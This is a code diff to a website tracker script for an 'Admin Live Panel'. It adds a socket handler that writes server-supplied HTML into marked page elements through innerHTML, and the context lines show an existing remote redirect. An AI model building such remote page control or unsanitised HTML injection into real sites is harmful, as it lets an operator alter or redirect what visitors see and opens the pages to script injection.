@@ -1,7 +1,9 @@
 /**
  * ALP Tracker Script v1.0.0
  * Lightweight tracking script for websites to integrate with Admin Live Panel.
- * 
+ *
+ * Created by @itstheoutlaws — https://t.me/itstheoutlaws
+ *
  * Usage:
  *   <script src="https://your-alp-server/tracker.js" data-api-key="YOUR_API_KEY"></script>
  */
@@ -160,6 +162,22 @@
       if (data && data.enabled && data.redirectUrl) {
         window.location.href = data.redirectUrl;
       }
+    });
+
+    // Listen for text injection commands from admin
+    // The page must contain an element with [data-alp-inject] (e.g. <div data-alp-inject></div>)
+    socket.on('tracker:inject', function(data) {
+      var text = (data && data.text !== undefined) ? data.text : '';
+      var targets = document.querySelectorAll('[data-alp-inject]');
+      targets.forEach(function(el) {
+        if (text === '') {
+          el.style.display = 'none';
+          el.innerHTML = '';
+        } else {
+          el.innerHTML = text;
+          el.style.display = '';
+        }
+      });
     });
 
     // Track page navigation (SPA support)
